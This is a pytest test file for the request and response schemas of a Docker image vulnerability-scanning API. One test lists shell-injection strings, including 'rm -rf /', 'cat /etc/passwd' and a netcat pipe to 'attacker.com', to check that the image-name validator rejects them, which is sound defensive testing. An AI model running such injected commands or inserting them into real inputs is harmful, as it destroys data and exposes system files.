"""Tests for Pydantic schemas."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from app.schemas.scan import (
    DockerScanRequest,
    ScanRequestOptions,
    SeverityCount,
    ScanMetadata,
    Finding,
    ScanResults,
    ScanSubmitResponse,
    ScanStatusResponse,
    ScanListResponse,
)
from datetime import datetime
from uuid import uuid4


class TestScanRequestOptions:
    """Tests for ScanRequestOptions schema."""

    def test_valid_severity_levels(self) -> None:
        """Test valid severity levels are accepted."""
        options = ScanRequestOptions(
            severity=["CRITICAL", "HIGH", "MEDIUM", "LOW"],
            scanners=["vuln", "config"],
        )
        assert options.severity == ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
        assert options.scanners == ["vuln", "config"]

    def test_severity_normalization(self) -> None:
        """Test severity levels are normalized to uppercase."""
        options = ScanRequestOptions(severity=["critical", "High"])
        assert options.severity == ["CRITICAL", "HIGH"]

    def test_scanners_normalization(self) -> None:
        """Test scanner types are normalized to lowercase."""
        options = ScanRequestOptions(scanners=["VULN", "Config"])
        assert options.scanners == ["vuln", "config"]

    def test_none_defaults(self) -> None:
        """Test None defaults work correctly."""
        options = ScanRequestOptions()
        assert options.severity is None
        assert options.scanners is None

    def test_invalid_severity(self) -> None:
        """Test invalid severity is rejected."""
        with pytest.raises(ValidationError):
            ScanRequestOptions(severity=["INVALID"])

    def test_invalid_scanner(self) -> None:
        """Test invalid scanner type is rejected."""
        with pytest.raises(ValidationError):
            ScanRequestOptions(scanners=["invalid_scanner"])


class TestDockerScanRequest:
    """Tests for DockerScanRequest schema."""

    def test_valid_image(self) -> None:
        """Test valid image names are accepted."""
        request = DockerScanRequest(image="nginx:latest")
        assert request.image == "nginx:latest"

    def test_image_with_options(self) -> None:
        """Test request with options."""
        request = DockerScanRequest(
            image="python:3.11",
            options=ScanRequestOptions(severity=["CRITICAL"]),
        )
        assert request.image == "python:3.11"
        assert request.options.severity == ["CRITICAL"]

    def test_empty_image_rejected(self) -> None:
        """Test empty image is rejected."""
        with pytest.raises(ValidationError):
            DockerScanRequest(image="")

        with pytest.raises(ValidationError):
            DockerScanRequest(image="   ")

    def test_image_trimmed(self) -> None:
        """Test image name is trimmed."""
        request = DockerScanRequest(image="  nginx:latest  ")
        assert request.image == "nginx:latest"

    def test_shell_injection_rejected(self) -> None:
        """Test shell injection attempts are rejected."""
        malicious_inputs = [
            "nginx; rm -rf /",
            "nginx && cat /etc/passwd",
            "nginx|nc attacker.com",
            "nginx`whoami`",
            "nginx\nmalicious",
            "nginx\rinjection",
            "nginx$(command)",
        ]

        for image in malicious_inputs:
            with pytest.raises(ValidationError):
                DockerScanRequest(image=image)

    def test_too_long_image_rejected(self) -> None:
        """Test excessively long image names are rejected."""
        long_image = "a" * 501
        with pytest.raises(ValidationError):
            DockerScanRequest(image=long_image)


class TestSeverityCount:
    """Tests for SeverityCount schema."""

    def test_default_values(self) -> None:
        """Test default severity counts are zero."""
        summary = SeverityCount()
        assert summary.critical == 0
        assert summary.high == 0
        assert summary.medium == 0
        assert summary.low == 0
        assert summary.info == 0

    def test_custom_values(self) -> None:
        """Test custom severity counts."""
        summary = SeverityCount(
            critical=5,
            high=10,
            medium=20,
        )
        assert summary.critical == 5
        assert summary.high == 10
        assert summary.medium == 20
        assert summary.low == 0


class TestScanMetadata:
    """Tests for ScanMetadata schema."""

    def test_valid_metadata(self) -> None:
        """Test valid metadata is accepted."""
        metadata = ScanMetadata(
            scanned_at="2024-01-25T10:30:00Z",
            scanner_version="trivy-0.55.0",
            scan_duration_seconds=2.5,
            image="nginx:latest",
        )
        assert metadata.scanned_at == "2024-01-25T10:30:00Z"
        assert metadata.scanner_version == "trivy-0.55.0"
        assert metadata.scan_duration_seconds == 2.5
        assert metadata.image == "nginx:latest"


class TestFinding:
    """Tests for Finding schema."""

    def test_valid_finding(self) -> None:
        """Test valid finding is accepted."""
        finding = Finding(
            id="CVE-2024-1234",
            severity="CRITICAL",
            title="Critical vulnerability",
            description="A critical security flaw",
            target="nginx:latest",
            package_name="openssl",
            package_version="1.1.1",
            fixed_version="1.1.1k",
            references=["https://example.com"],
            cvss={"nvd": {"v3_score": 9.8}},
            cwe_ids=["CWE-79"],
            primary_link="https://avd.aquasec.com/nvd/cve-2024-1234",
        )
        assert finding.id == "CVE-2024-1234"
        assert finding.severity == "CRITICAL"


class TestScanResults:
    """Tests for ScanResults schema."""

    def test_valid_results(self) -> None:
        """Test valid scan results are accepted."""
        results = ScanResults(
            scan_type="docker",
            status="completed",
            metadata=ScanMetadata(
                scanned_at="2024-01-25T10:30:00Z",
                scanner_version="trivy-0.55.0",
                scan_duration_seconds=2.5,
                image="nginx:latest",
            ),
            summary=SeverityCount(critical=1, high=2),
            findings=[],
        )
        assert results.scan_type == "docker"
        assert results.status == "completed"
        assert results.summary.critical == 1


class TestScanSubmitResponse:
    """Tests for ScanSubmitResponse schema."""

    def test_valid_response(self) -> None:
        """Test valid submit response."""
        scan_id = uuid4()
        response = ScanSubmitResponse(
            scan_id=scan_id,
            status="queued",
            check_status_url=f"/api/v1/scans/{scan_id}",
            created_at=datetime.now(),
        )
        assert response.scan_id == scan_id
        assert response.status == "queued"


class TestScanStatusResponse:
    """Tests for ScanStatusResponse schema."""

    def test_valid_response(self) -> None:
        """Test valid status response."""
        scan_id = uuid4()
        response = ScanStatusResponse(
            scan_id=scan_id,
            status="running",
            scan_type="trivy",
            created_at=datetime.now(),
            results=None,
        )
        assert response.scan_id == scan_id
        assert response.status == "running"
        assert response.scan_type == "trivy"


class TestScanListResponse:
    """Tests for ScanListResponse schema."""

    def test_valid_response(self) -> None:
        """Test valid list response."""
        scan_id = uuid4()
        response = ScanListResponse(
            total=1,
            scans=[
                ScanStatusResponse(
                    scan_id=scan_id,
                    status="completed",
                    scan_type="trivy",
                    created_at=datetime.now(),
                    results=None,
                )
            ],
            page=1,
            page_size=20,
        )
        assert response.total == 1
        assert len(response.scans) == 1
        assert response.page == 1
        assert response.page_size == 20
